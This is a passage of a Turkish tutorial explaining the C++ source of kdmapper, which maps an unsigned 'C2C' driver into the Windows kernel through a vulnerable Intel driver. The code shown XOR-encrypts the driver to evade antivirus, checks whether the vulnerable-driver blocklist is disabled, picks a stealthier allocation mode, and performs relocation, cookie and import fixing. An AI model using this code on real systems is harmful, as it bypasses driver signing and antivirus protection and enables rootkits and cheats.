`RollingVectorProcedure(cfg::image, cfg::key)`: Bu fonksiyon driver'ın şifresini çözer. XOR şifrelemesi kullanır. Yani her byte'ı, şifreleme anahtarındaki ilgili byte ile XOR eder. (XOR, bitsel "özel veya" operatörüdür.)

`img = cfg::image.data();`: Şifre çözüldükten sonra, `img` pointer'ı binary'nin başlangıcını gösteriyor.

Şifrelenme neden var? Çünkü eğer driver binary'sini ham olarak (şifresiz) saklarsak, antivirus programları onu tespit edebilir. Şifreliyken tespit edilmesi daha zor.

```cpp
if (!NT_SUCCESS(intel_driver::Load()))
    Log::Error("Failed to connect to intel driver");
```

`intel_driver::Load()`: Intel driver'ı yükleyen fonksiyon. Bir `NTSTATUS` (Windows'a özel bir hata kodu) döndürür.

`NT_SUCCESS(...)`: Bir makro (kısaltma). NTSTATUS kodu başarılı mı kontrol eder. Başarılıysa true, başarısızsa false.

Yani burada Intel driver'ı yükle, eğer başarısız olursa hata ver diyoruz.

```cpp
kdmapper::AllocationMode mode = kdmapper::AllocationMode::AllocatePool;
if (indPagesMode)
    mode = kdmapper::AllocationMode::AllocateIndependentPages;
```

`kdmapper::AllocationMode`: Bu bir **enum** (numaralandırma). Enum, bir değişkenin alabileceği değerleri sınırlar.

İki mod var:
- `AllocatePool`: Bellekten bitişik bir alan ayır. Hızlı ama tespit edilebilir.
- `AllocateIndependentPages`: Bellekten parçalanmış sayfalar ayır. Daha gizli.

Eğer secure mode istiyorsak ikinci modu seçiyoruz.

```cpp
NTSTATUS exitCode = 0;
if (!kdmapper::MapDriver(img, 0, 0, free, !copyHeader, mode, passAllocationPtr, callbackExample, &exitCode))
{
    intel_driver::Unload();
    Log::Error("Failed to map C2C driver");
}
```

İşte kalbimizin attığı yer! `kdmapper::MapDriver()` fonksiyonu çağırıyoruz. Parametreleri:

1. `img`: Driver binary'sinin pointer'ı
2. `0`: param1 (entry point'e geçilecek 1. parametre)
3. `0`: param2 (entry point'e geçilecek 2. parametre)
4. `free`: Bellek serbest bırakılsın mı?
5. `!copyHeader`: Header silinsin mi? `copyHeader` false olduğu için bu true olur.
6. `mode`: Allocation modu
7. `passAllocationPtr`: Pointer parametre olarak geçilsin mi?
8. `callbackExample`: Callback fonksiyonu (entry point çağrılmadan önce çağrılır)
9. `&exitCode`: NTSTATUS değerinin yazılacağı yer (`&` adresini al)

Eğer mapping başarısız olursa Intel driver'ı kaldırıp hata veriyoruz.

```cpp
if (!NT_SUCCESS(intel_driver::Unload()))
    Log::Warning("Warning failed to unload intel driver", true);

Log::Fine("C2C driver mapped successfully");
system("pause");
return 0;
```

İşimiz bitti. Intel driver'ı kaldırıyoruz (artık ihtiyacımız yok). Sonra başarı mesajı yazdırıyoruz, "tuşa bas" diyoruz ve 0 döndürerek programdan çıkıyoruz. 0 başarı demek.

## 2.5 CheckWindowsKernelPrefs() - Windows Ayarlarını Kontrol Et

```cpp
bool CheckWindowsKernelPrefs() 
{
    HKEY hKey;
```

`HKEY`: "Handle to a Key", yani registry anahtarına işaretçi. Bu Windows'a özel bir tip. Registry'de bir anahtar açtığımızda bu tipte bir handle alırız.

```cpp
LONG openStatus = RegOpenKeyExA(
    HKEY_LOCAL_MACHINE,
    "SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
    0,
    KEY_READ,
    &hKey
);
```

`RegOpenKeyExA`: Registry'de bir anahtarı açma fonksiyonu. Sondaki `A` "ANSI" demek (yani normal ASCII karakterler). Bir de `RegOpenKeyExW` versiyonu var (Unicode için).

Parametreleri:
1. `HKEY_LOCAL_MACHINE`: Registry'nin "Local Machine" kökünü kullan.
2. `"SYSTEM\\CurrentControlSet\\Control\\CI\\Config"`: Açılacak yol. Çift backslash, gerçek backslash.
3. `0`: Reserved (ayrılmış, kullanılmıyor).
4. `KEY_READ`: Sadece okuma yetkisi istiyoruz.
5. `&hKey`: Açılan anahtarın handle'ı buraya yazılsın.

Sonuç olarak `openStatus`, bu işlemin başarılı olup olmadığını söyler.

```cpp
if (openStatus != ERROR_SUCCESS)
    return false;
```

Eğer açılamadıysa (`ERROR_SUCCESS` değilse) `false` döndürüyoruz.

```cpp
DWORD data = 0;
DWORD dataSize = sizeof(data);
DWORD type = 0;

LONG queryStatus = RegQueryValueExA(
    hKey,
    "VulnerableDriverBlocklistEnable",
    nullptr,
    &type,
    (LPBYTE)&data,
    &dataSize
);
```

`DWORD`: "Double Word", yani 32-bit (4 byte) tamsayı.

`sizeof(data)`: `data` değişkeninin kaç byte olduğunu döndürür (4 byte).

`RegQueryValueExA`: Registry'den bir değer okuma fonksiyonu.

Parametreleri:
1. `hKey`: Açtığımız anahtarın handle'ı.
2. `"VulnerableDriverBlocklistEnable"`: Okuyacağımız değerin adı.
3. `nullptr`: Reserved.
4. `&type`: Değerin tipinin yazılacağı yer.
5. `(LPBYTE)&data`: Değerin yazılacağı yer. `(LPBYTE)` bir tip dönüşümü (cast). `LPBYTE` "Long Pointer to BYTE" demek.
6. `&dataSize`: Veri boyutunun yazılacağı yer.

```cpp
RegCloseKey(hKey);
```

Anahtar artık kapatılıyor. Açtığın her şeyi kapatmak iyi bir uygulamadır.

```cpp
if (queryStatus == ERROR_SUCCESS)
{
    if (type == REG_DWORD)
    {
        if (static_cast<int>(data) == 0)
            return true;
        else
            return false;
    }
}
return false;
```

Sorgulama başarılıysa ve tip DWORD ise, değeri kontrol et. 0 ise true (vulnerable driver list devre dışı, biz yükleyebiliriz), değilse false döndür.

`static_cast<int>(data)`: `data`'yı int'e dönüştür. `static_cast` C++'ın tip dönüşüm yöntemlerinden biri.

## 2.6 SimplestCrashHandler() - Çöküş Yakalayıcı

```cpp
LONG WINAPI SimplestCrashHandler(EXCEPTION_POINTERS* ExceptionInfo)
{
```

Bu fonksiyon program çöktüğünde çağrılıyor. `EXCEPTION_POINTERS*` çöküş bilgilerini içeren struct'a pointer.

```cpp
if (ExceptionInfo && ExceptionInfo->ExceptionRecord)
{
    std::ostringstream oss;
    oss << "Crash at addr 0x" << ExceptionInfo->ExceptionRecord->ExceptionAddress 
        << L" by 0x" << std::hex << ExceptionInfo->ExceptionRecord->ExceptionCode;
    Log::Error(oss.str(), false);
}
else
    Log::Error("Program crashed", false);
```

`ExceptionInfo && ExceptionInfo->ExceptionRecord`: ExceptionInfo NULL değil VE içindeki ExceptionRecord da NULL değil. NULL pointer'a erişmek crash yapar, bu yüzden kontrol ediyoruz.

`std::ostringstream oss;`: Bir string stream oluştur. Bu, parça parça metin oluşturmak için kullanılır.

`oss << "Crash at addr 0x" << ...;`: Bir takım şeyleri stream'e yaz.

`std::hex`: Bundan sonraki sayıları onaltılık (hexadecimal) yaz.

`oss.str()`: Stream'in içeriğini string olarak al.

```cpp
if (intel_driver::hDevice)
    intel_driver::Unload();

return EXCEPTION_EXECUTE_HANDLER;
```

Eğer Intel driver hala açıksa, kapat. Sonra `EXCEPTION_EXECUTE_HANDLER` döndür - bu Windows'a "tamam, hatayı yakaladım, programı sonlandırabilirsin" diyor.

## 2.7 callbackExample() - Callback Örneği

```cpp
bool callbackExample(ULONG64* param1, ULONG64* param2, ULONG64 allocationPtr, ULONG64 allocationSize)
{
    UNREFERENCED_PARAMETER(param1);
    UNREFERENCED_PARAMETER(param2);
    UNREFERENCED_PARAMETER(allocationPtr);
    UNREFERENCED_PARAMETER(allocationSize);
    Log::Fine("Driver callback called");
    return true;
}
```

Bu fonksiyon, mapping'in son aşamasında, driver'ın entry point'i çağrılmadan hemen önce çağrılır. Burada son ayarlamalar yapılabilir.

`ULONG64`: 64-bit unsigned long (işaretsiz uzun tamsayı). Yani 0 ile çok büyük bir sayı arasında değer alabilir.

`UNREFERENCED_PARAMETER(...)`: Bu parametreyi kullanmadığımızı derleyiciye söyler. Böylece "kullanılmayan parametre" uyarısı vermez.

`return true;`: Mapping'in devam etmesi için true döndürmeliyiz. False dönersek mapping iptal olur.

## 2.8 getParentProcess() - Ebeveyn İşlemi Bul

```cpp
DWORD getParentProcess()
{
    HANDLE hSnapshot;
    PROCESSENTRY32 pe32;
    DWORD ppid = 0, pid = GetCurrentProcessId();
```

Bu fonksiyon, mevcut işlemimizi başlatan işlemi (yani "ebeveyn") bulur.

`HANDLE`: Genel amaçlı tutamak (handle). Windows'ta her şeyin bir handle'ı olabilir.

`PROCESSENTRY32`: Bir işlem hakkında bilgi içeren struct.

`DWORD ppid = 0, pid = GetCurrentProcessId();`: İki tane DWORD oluştur. `ppid` (parent process id) 0 başlangıç değeri. `pid` (process id) `GetCurrentProcessId()` fonksiyonunu çağırarak mevcut işlem ID'mizi al.

```cpp
hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
__try {
    if (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == 0) __leave;

    ZeroMemory(&pe32, sizeof(pe32));
    pe32.dwSize = sizeof(pe32);
    if (!Process32First(hSnapshot, &pe32)) __leave;

    do {
        if (pe32.th32ProcessID == pid) {
            ppid = pe32.th32ParentProcessID;
            break;
        }
    } while (Process32Next(hSnapshot, &pe32));
}
__finally {
    if (hSnapshot != INVALID_HANDLE_VALUE && hSnapshot != 0) CloseHandle(hSnapshot);
}
return ppid;
```

`CreateToolhelp32Snapshot`: Sistemdeki işlemlerin anlık görüntüsünü (snapshot) alır. `TH32CS_SNAPPROCESS` flag'i, sadece işlem listesini istediğimizi söyler.

`__try { ... } __finally { ... }`: Microsoft'a özel bir hata yönetimi yapısı. `__try` bloğundaki kod çalışır. Ne olursa olsun (hata olsun veya olmasın), `__finally` bloğundaki kod çalışır. `__leave` ise `__try` bloğundan çıkıp `__finally`'ye geçer.

`ZeroMemory(&pe32, sizeof(pe32));`: pe32 struct'ının tüm byte'larını 0 yap. Yeni oluşturulan değişkenler bazen rastgele değer içerir, bunu önler.

`pe32.dwSize = sizeof(pe32);`: Windows API'nin gerektirdiği bir şey. Struct'ın boyutunu kendisine söylüyoruz.

`Process32First` ve `Process32Next`: İşlem listesinde dolaşmak için. İlki ilk işleme gider, ikincisi sonraki işleme.

`do { ... } while(...)`: Do-while döngüsü. İçindeki kod en az bir kere çalışır.

İçinde her işlemi kontrol ediyor. Eğer bizim ID'mizle eşleşen bulursa, o işlemin parent ID'sini alır ve döngüden çıkar.

`CloseHandle(hSnapshot);`: Handle'ı kapat (kaynak temizliği).

## 2.9 CheckArg() - Parametre Kontrolü

```cpp
bool CheckArg(const int argc, wchar_t** argv, const wchar_t* arg)
{
    size_t plen = wcslen(arg);

    for (int i = 1; i < argc; i++)
    {
        if (wcslen(argv[i]) == plen + 1ull && _wcsicmp(&argv[i][1], arg) == 0 && argv[i][0] == '/')
            return true;
        else if (wcslen(argv[i]) == plen + 2ull && _wcsicmp(&argv[i][2], arg) == 0 && argv[i][0] == '-' && argv[i][1] == '-')
            return true;
    }
    return false;
}
```

`size_t`: İşaretsiz boyut tipi. Genelde dizilerin uzunluğunu tutmak için kullanılır.

`wcslen(arg)`: Wide character string'in uzunluğunu döndürür. Mesela L"securemode" için 10 döndürür.

`for (int i = 1; i < argc; i++)`: Bir döngü. `i` 1'den başlar, `argc`'den küçük olduğu sürece devam eder, her döngüde `i` 1 artar. Neden 0'dan değil 1'den başlıyor? Çünkü `argv[0]` her zaman programın kendisi, parametre değil.

`wcslen(argv[i]) == plen + 1ull`: i'inci parametrenin uzunluğu, aradığımız argümandan 1 fazla mı? `ull` "unsigned long long" demek, sayının tipini söyler.

`_wcsicmp(&argv[i][1], arg) == 0`: i'inci parametrenin ikinci karakterinden itibaren, aradığımız argümanla aynı mı? Büyük/küçük harf duyarsız (`i` "case-insensitive" demek).

`&argv[i][1]`: argv[i] dizisinin 1. indexindeki elemanın adresi. Yani metin'in 2. karakterinden başlayan kısmı.

`argv[i][0] == '/'`: i'inci parametrenin ilk karakteri `/` mi?

Yani burada şunu kontrol ediyoruz: Parametre `/securemode` formatında mı? Eğer öyleyse true döndür. Diğer kısım da `--securemode` formatını kontrol ediyor.

## 2.10 IsDriverRunning() - Driver Yüklü mü?

```cpp
bool IsDriverRunning(const LPCWSTR name)
{
    HANDLE kernelDriver = CreateFile(name, GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (kernelDriver == INVALID_HANDLE_VALUE)
        return false;

    BOOL result = CloseHandle(kernelDriver);
    return true;
}
```

`CreateFile`: Bir dosyayı (veya cihazı) açma fonksiyonu. Adı yanıltıcı, sadece dosya değil, cihaz da açar.

Parametreleri:
1. `name`: Açılacak dosya/cihaz adı.
2. `GENERIC_READ | GENERIC_WRITE`: Okuma ve yazma yetkisi. `|` operatörü bitwise OR.
3. `0`: Paylaşma yok (başka kimse bu cihazı aynı anda açamaz).
4. `nullptr`: Güvenlik özniteliği yok (varsayılan).
5. `OPEN_EXISTING`: Mevcut olanı aç (yoksa hata ver).
6. `FILE_ATTRIBUTE_NORMAL`: Normal dosya öznitelikleri.
7. `nullptr`: Template handle yok.

Eğer açılamazsa `INVALID_HANDLE_VALUE` döner. Açılırsa, demek ki driver yüklü ve cihazı oluşturmuş.

`CloseHandle(kernelDriver);`: Açtığımız handle'ı kapat.

---

# BÖLÜM 3: kdmapper.cpp - ASIL MAPPING İŞİ

## 3.1 kdmapper.cpp'nin Genel Amacı

Bu dosya, projenin kalbidir. Driver'ı çekirdeğe yükleme işini burada yapıyoruz. Bu dosyanın yaptığı işler:

1. PE (Portable Executable) dosyasını parse et (yapısını anla)
2. Bellekte kullanıcı modunda driver için yer ayır
3. Driver'ın bölümlerini (sections) bu yere kopyala
4. Çekirdekte driver için yer ayır (Intel driver vasıtasıyla)
5. Adres değişiklikleri yap (relocation)
6. Stack cookie düzelt
7. Import'ları çöz (DLL fonksiyonlarını bağla)
8. Hazır image'ı çekirdek belleğine yaz
9. Driver'ın entry point'ini çağır

Şimdi her fonksiyonu tek tek inceleyelim.

## 3.2 RelocateImageByDelta() - Adres Düzeltme

Bu fonksiyonu anlamak için önce **relocation** kavramını derinlemesine anlamamız lazım.

### Relocation Nedir, Neden Gereklidir?

Bir program (veya driver) derlenirken (compile edilirken), derleyici "ben bu programın bellekte şu adrese yükleneceğini varsayıyorum" der. Bu adrese **ImageBase** denir. Mesela ImageBase 0x140000000 olabilir.

Programın içindeki bütün sabit adresler bu varsayım üzerine yazılır. Mesela kod şuna benzer bir komut içerebilir:
```
[0x140001234] adresinden veriyi oku
```

Eğer program gerçekten 0x140000000 adresine yüklenirse her şey yolunda. Ama eğer başka bir yere (mesela 0x7FFF0000) yüklenirse, o zaman komut yanlış adresi okumaya çalışır ve hata verir.

İşte burada **relocation** devreye girer. PE dosyasında, "şu adresleri düzeltmen gerekiyor" diyen bir tablo bulunur. Buna **relocation table** denir.

### Relocation Table'ın Yapısı

Relocation table, bloklar halinde organize edilmiştir. Her blok bir bellek sayfasına (page, genelde 4KB) ait relocation'ları içerir. Bir blok şöyle görünür:

```
BLOK BAŞLIĞI:
  VirtualAddress: Bu blok hangi sayfa için (mesela 0x1000)
  SizeOfBlock:    Bu blok ne kadar büyük (byte cinsinden)

ENTRYLAR:
  Her entry 16 bit (2 byte). Üst 4 bit tip, alt 12 bit offset.
  Mesela 0x3010:
    Tip = 0x3 = IMAGE_REL_BASED_DIR64 (64-bit adres)
    Offset = 0x010 = bu sayfa içinde 16. byte
```

Yani her entry diyor ki: "Bu sayfanın içinde, şu offset'te 64-bit bir adres var, onu düzelt."

### Düzeltme Nasıl Yapılır?

Düzeltme çok basit: O adresteki değere **delta** eklenir. Delta, gerçek yükleme adresi ile beklenen adres arasındaki farktır:

```
delta = gerçek_adres - beklenen_adres
```

Örnek:
- Beklenen: 0x140000000
- Gerçek: 0x7FFF0000
- delta = 0x7FFF0000 - 0x140000000 = -0x34101000 (eksi olabilir)

Şimdi adresteki değer 0x140001234 ise:
- 0x140001234 + (-0x34101000) = 0x7FFF1234

İşte düzeltme!

### Şimdi Kodu İnceleyelim

```cpp
void RelocateImageByDelta(portable_executable::vec_relocs relocs, const ULONG64 delta) {
```

`void`: Bu fonksiyon hiçbir şey döndürmüyor.

`portable_executable::vec_relocs relocs`: Relocation bloklarının listesi. `vec_relocs` bizim tanımladığımız bir tip (relocation bloklarının vektörü).

`const ULONG64 delta`: Delta değeri. `ULONG64` 64-bit unsigned long. `const` ise fonksiyon içinde değiştirilmeyeceğini söyler.

```cpp
for (const auto& current_reloc : relocs) {
```

Bu **range-based for** döngüsü. Modern C++'ta dizilerde dolaşmanın güzel bir yolu. Anlamı: "relocs içindeki her elemanı sırayla `current_reloc` olarak al ve işle."

`const auto&`: 
- `auto`: Tipi otomatik belirle.
- `const`: Değiştirme.
- `&`: Referans olarak al (kopyalama yapma, hızlı).

```cpp
for (auto i = 0u; i < current_reloc.count; ++i) {
```

İç döngü. Her relocation bloğunun içindeki entry'leri dolaşıyor.

`0u`: 0 ama unsigned olarak (negatif olamaz).

`++i`: i'yi 1 artır. `i++` da olur ama `++i` biraz daha hızlı (artırma sonra dönüş yerine, önce artırıp dönüş).

```cpp
const uint16_t type = current_reloc.item[i] >> 12;
```

`uint16_t`: 16-bit unsigned integer. Yani 0-65535 arası bir sayı.

`current_reloc.item[i]`: i'inci entry'i al.

`>> 12`: 12 bit sağa kaydır. Yani üst 4 biti elde et. (Bir entry 16 bit, 12 bit kaydırırsak sadece üst 4 bit kalır.)

Sonuç: Type değeri (relocation tipi).

```cpp
const uint16_t offset = current_reloc.item[i] & 0xFFF;
```

`& 0xFFF`: Bitwise AND. 0xFFF onaltılıkta `0000111111111111` demek. Yani üst 4 biti sıfırla, alt 12 biti tut.

Sonuç: Offset (sayfa içindeki yer).

```cpp
if (type == IMAGE_REL_BASED_DIR64)
    *reinterpret_cast<ULONG64*>(current_reloc.address + offset) += delta;
```

`IMAGE_REL_BASED_DIR64`: 64-bit relocation tipi (en yaygın olanı).

`current_reloc.address + offset`: Düzeltilecek adres.

`reinterpret_cast<ULONG64*>(...)`: Bu adresi ULONG64'e işaret eden pointer olarak yorumla.

`*...`: Pointer'ın işaret ettiği yerdeki değere ulaş.

`+= delta`: Bu değere delta ekle.

Yani: O adresteki 64-bit değere delta ekle. Bu kadar basit!

## 3.3 FixSecurityCookie() - Stack Cookie Düzeltme

### Stack Cookie Nedir?

Modern programlar, **stack buffer overflow** saldırılarına karşı korunmak için stack cookie kullanır. Şöyle çalışır:

Bir fonksiyon çağrıldığında, stack'te bazı şeyler var:
```
+------------------+
| Geri dönüş adresi | (fonksiyon bittikten sonra nereye dönülecek)
+------------------+
| Stack cookie      | (rastgele bir kontrol değeri)
+------------------+
| Yerel değişkenler |
+------------------+
| Buffer (veri)     |
+------------------+
```

Eğer bir saldırgan buffer'ı taşırırsa (overflow), önce stack cookie'yi, sonra geri dönüş adresini bozar. Fonksiyon bitmek üzereyken, programcı stack cookie'yi kontrol eder. Eğer değişmişse, "biri saldırı yapıyor!" der ve programı sonlandırır.

Stack cookie **derleme zamanında** belirlenir. Yani driver derlenirken, içine bir başlangıç değeri konur (Windows'ta `0x2B992DDFA232`). Sonra driver yüklendiğinde, bu değer rastgele bir şeyle değiştirilir.

### Sorun Ne?

Biz driver'ı normal yoldan yüklemediğimiz için, Windows bizim için cookie'yi değiştirmez. Cookie hala başlangıç değerinde kalır. Bu da driver'ın istediği gibi çalışmasına engel olabilir.

**Çözüm:** Cookie'yi kendimiz değiştireceğiz.

### Kodu İnceleyelim

```cpp
bool FixSecurityCookie(void* local_image, ULONG64 kernel_image_base)
{
    auto headers = portable_executable::GetNtHeaders(local_image);
    if (!headers)
        return false;
```

`void* local_image`: Driver'ın yerel bellekteki kopyasının adresi. `void*`, "her tipe işaret edebilen pointer" demek.

`auto headers = ...`: NT header'ları al. `auto` ile tipini belirtmedik, derleyici otomatik belirleyecek (PIMAGE_NT_HEADERS64).

```cpp
auto load_config_directory = headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
if (!load_config_directory)
{
    Log::Fine("Load config directory wasn't found, probably StackCookie not defined, fix cookie skipped");
    return true;
}
```

Cookie bilgisi PE dosyasının "Load Config Directory" denen yerinde tutulur. Eğer bu yer yoksa, cookie yok demektir, problem yok.

`headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG]`: Header'lardaki Optional Header'ın içindeki DataDirectory dizisinin Load Config index'i.

`.VirtualAddress`: Bu directory'nin sanal adresi (offset).

`->` operatörü, pointer üzerinden bir struct'a erişmek için kullanılır.

```cpp
auto load_config_struct = (PIMAGE_LOAD_CONFIG_DIRECTORY)((uintptr_t)local_image + load_config_directory);
```

Load Config Directory struct'ına ulaşıyoruz. `(uintptr_t)local_image`: pointer'ı tamsayıya dönüştür. Sonra offset ekle. Sonra tekrar PIMAGE_LOAD_CONFIG_DIRECTORY pointer'ına dönüştür.

`uintptr_t`: Pointer'ın değerini tutabilecek büyüklükte bir unsigned tamsayı.

```cpp
auto stack_cookie = load_config_struct->SecurityCookie;
if (!stack_cookie)
{
    Log::Fine("StackCookie not defined, fix cookie skipped");
    return true;
}
```

Cookie'nin adresini al. Eğer yoksa, problem yok.

```cpp
stack_cookie = stack_cookie - (uintptr_t)kernel_image_base + (uintptr_t)local_image;
```

Şimdi dikkatli ol! Bu satır kritik.

`stack_cookie` değeri, kernel_image_base'e göre bir adres. Yani driver kernel'e yüklendikten sonra cookie'nin olacağı yer. Ama bizim şu anda yerel bellekte çalışıyoruz! Bu yüzden adresi yerel belleğe çevirmemiz lazım:

`stack_cookie - kernel_image_base`: Cookie'nin image içindeki offset'i.
`+ local_image`: Yerel bellekteki gerçek adresi.

```cpp
if (*(uintptr_t*)(stack_cookie) != 0x2B992DDFA232) {
    Log::Error("StackCookie already fixed!? this probably wrong", false);
    return false;
}
```

Cookie'nin değerini kontrol et. Eğer beklediğimiz başlangıç değeri (0x2B992DDFA232) değilse, bir şeyler yanlış. Hata ver.

`*(uintptr_t*)(stack_cookie)`: stack_cookie adresindeki uintptr_t değerini al.

```cpp
auto new_cookie = 0x2B992DDFA232 ^ GetCurrentProcessId() ^ GetCurrentThreadId();
if (new_cookie == 0x2B992DDFA232)
    new_cookie = 0x2B992DDFA233;
```

Yeni cookie'yi hesapla. `^` operatörü XOR (özel veya). XOR'un güzel özelliği: aynı şeyle iki defa XOR edersen orijinal değeri geri alırsın.

`GetCurrentProcessId()`: Mevcut işlemin ID'si.
`GetCurrentThreadId()`: Mevcut thread'in ID'si.

Bunları XOR'layarak biraz rastgelelik elde ediyoruz.

Eğer tesadüfen sonuç başlangıç değerine eşitse, bir tane artırıyoruz (cookie değişmemiş gibi görünmesin diye).

```cpp
*(uintptr_t*)(stack_cookie) = new_cookie;
return true;
```

Yeni cookie'yi yaz.

## 3.4 ResolveImports() - Import Çözümü

### Import Nedir?

Bir driver, başka modüllerin (ntoskrnl.exe gibi) fonksiyonlarını kullanır. Mesela bellek allocate etmek için `ExAllocatePoolWithTag` fonksiyonunu çağırır. Ama bu fonksiyon ntoskrnl.exe'de tanımlı, bizim driver'da değil.

Derleme zamanında, derleyici "ben bu fonksiyonun adresini bilmiyorum, ama kullanıyorum" der. Bunun için bir **Import Address Table (IAT)** oluşturur. IAT, kullanılan dış fonksiyonların adreslerinin bulunduğu bir tablodur. Başlangıçta boş/0 olur, çalışma zamanında doldurulur.

Driver yüklendiğinde, bu IAT'ı doldurmak gerekir. Yani her dış fonksiyon için, gerçek adresini bulup IAT'a yazmalıyız.

### Kodu İnceleyelim

```cpp
bool ResolveImports(portable_executable::vec_imports imports) {
    for (const auto& current_import : imports) {
```

Tüm import'ların listesi üzerinde dolaşıyoruz. Her `current_import` bir DLL/modülü temsil eder.

```cpp
ULONG64 Module = kdmUtils::GetKernelModuleAddress(current_import.module_name);
std::ostringstream ss;

if (!Module) 
{
    ss << "Dependency " << current_import.module_name << " wasn't found";
    Log::Error(ss.str(), false);
    ss.str("");
    return false;
}
```

`GetKernelModuleAddress`: Çekirdekte yüklü modüllerin arasında, belirtilen isimde olanı bul. Mesela "ntoskrnl.exe" için ntoskrnl'in çekirdek belleğindeki adresini döndürür.

Eğer bulamazsa hata.

`ss.str("")`: String stream'i temizle. Sonra tekrar kullanılacak.

```cpp
for (auto& current_function_data : current_import.function_datas) {
    ULONG64 function_address = intel_driver::GetKernelModuleExport(Module, current_function_data.name);
```

Şimdi modül içindeki her fonksiyon için, fonksiyonun adresini buluyoruz.

`GetKernelModuleExport`: Bir modülün export tablosunda belirtilen fonksiyonu bul ve adresini döndür.

```cpp
if (!function_address) {
    if (Module != intel_driver::ntoskrnlAddr) {
        function_address = intel_driver::GetKernelModuleExport(intel_driver::ntoskrnlAddr, current_function_data.name);
        if (!function_address) {
            ss << "Failed to resolve import " << current_function_data.name << " (" << current_import.module_name << ")";
            Log::Error(ss.str(), false);
            ss.str("");
            return false;
        }
    }
}
```

Eğer fonksiyon belirtilen modülde yoksa, ntoskrnl.exe'de aramayı dene. Bu yedek bir mekanizma. Hala bulunamazsa hata ver.

```cpp
*current_function_data.address = function_address;
```

Fonksiyon adresini IAT'a yaz. `current_function_data.address` IAT'taki yerin adresi (pointer to pointer). `*` ile o adrese erişip yazıyoruz.

## 3.5 MapDriver() - Asıl Mapping Fonksiyonu

Bu en uzun ve en önemli fonksiyon. Adım adım inceleyelim.

```cpp
ULONG64 kdmapper::MapDriver(BYTE* data, ULONG64 param1, ULONG64 param2, bool free, bool destroyHeader, AllocationMode mode, bool PassAllocationAddressAsFirstParam, mapCallback callback, NTSTATUS* exitCode) {
```

Parametrelerini hatırlayalım:
- `data`: Şifre çözülmüş driver binary'si
- `param1`, `param2`: Driver entry point'e geçilecek parametreler
- `free`: Sonra bellek serbest bırak mı?
- `destroyHeader`: Header silinsin mi?
- `mode`: Allocation modu (Pool veya IndependentPages)
- `PassAllocationAddressAsFirstParam`: Adres parametre olarak geçsin mi?
- `callback`: Entry point çağrılmadan önce çalışacak fonksiyon
- `exitCode`: Entry point'in dönüş değeri buraya yazılacak

```cpp
const PIMAGE_NT_HEADERS64 nt_headers = portable_executable::GetNtHeaders(data);
std::ostringstream ss;

if (!nt_headers) {
    Log::Error("Invalid format of PE image", false);
    return 0;
}

if (nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    Log::Error("Image is not 64 bit", false);
    return 0;
}
```

NT header'ları al. Eğer alamazsak, geçersiz PE dosyası.

`Magic` değeri 64-bit PE için `IMAGE_NT_OPTIONAL_HDR64_MAGIC` (0x20B). Eğer değilse, 32-bit dosya, biz 64-bit istiyoruz.

```cpp
ULONG32 image_size = nt_headers->OptionalHeader.SizeOfImage;

void* local_image_base = VirtualAlloc(nullptr, image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
if (!local_image_base)
    return 0;
```

`SizeOfImage`: Driver belleğe yüklendiğinde toplam ne kadar yer kaplayacak.

`VirtualAlloc`: Windows'tan bellek iste fonksiyonu. Parametreleri:
1. `nullptr`: İstediği yerde olabilir.
2. `image_size`: Boyut.
3. `MEM_RESERVE | MEM_COMMIT`: Hem reserv et, hem hemen kullan.
4. `PAGE_READWRITE`: Okuma ve yazma izni.

Başarısız olursa nullptr döner.

```cpp
DWORD TotalVirtualHeaderSize = (IMAGE_FIRST_SECTION(nt_headers))->VirtualAddress;
image_size = image_size - (destroyHeader ? TotalVirtualHeaderSize : 0);
```

`IMAGE_FIRST_SECTION(nt_headers)`: NT header'lardan ilk section header'a git. Bir makro.

`->VirtualAddress`: İlk section'un sanal adresi. Yani header'ın bittiği yer.

Eğer header silinecekse, image_size'dan header boyutunu çıkar.

`destroyHeader ? TotalVirtualHeaderSize : 0`: Bu **ternary operator** (üçlü operatör). "destroyHeader doğruysa TotalVirtualHeaderSize, değilse 0" demek. `if/else`'in kısa versiyonu.

```cpp
ULONG64 kernel_image_base = 0;
if (mode == AllocationMode::AllocateIndependentPages)
{
    kernel_image_base = intel_driver::MmAllocateIndependentPagesEx(image_size);
}
else {
    kernel_image_base = intel_driver::AllocatePool(nt::POOL_TYPE::NonPagedPool, image_size);
}
```

Çekirdekte bellek allocate ediyoruz. İki yol var:
1. **Independent Pages**: Bellekte parçalı sayfalar. Daha gizli.
2. **Pool**: Bitişik bellek bölgesi. Daha hızlı.

`MmAllocateIndependentPagesEx` ve `AllocatePool` Intel driver vasıtasıyla çekirdekte bellek alır.

`NonPagedPool`: Sayfalanamayan pool. Yani bu bellek diske swap edilmez. Çekirdek için önemli.

```cpp
if (!kernel_image_base) {
    Log::Error("Failed to allocate remote image in kernel", false);
    VirtualFree(local_image_base, 0, MEM_RELEASE);
    return 0;
}
```

Allocate başarısızsa, yerel belleği de serbest bırak ve dön.

`VirtualFree`: Daha önce VirtualAlloc ile alınan belleği serbest bırakır.

```cpp
do
{
    ss << "Image base has been allocated at 0x" << reinterpret_cast<void*>(kernel_image_base);
    Log::Fine(ss.str());
    ss.str("");
```

`do { } while(0);` bir deyim. Aslında döngü yok, sadece içerden `break` yapabilmek için. C++'ta, hata durumunda temizlik yapmanın yaygın bir yolu.

Çekirdek allocation adresini logla.

```cpp
memcpy(local_image_base, data, nt_headers->OptionalHeader.SizeOfHeaders);
```

Driver'ın header'larını yerel belleğe kopyala.

`memcpy`: "Memory copy". Bir bellek bölgesini başka bir yere kopyalar. Parametreleri:
1. Hedef
2. Kaynak
3. Boyut

```cpp
const PIMAGE_SECTION_HEADER current_image_section = IMAGE_FIRST_SECTION(nt_headers);

for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
    if ((current_image_section[i].Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA) > 0)
        continue;
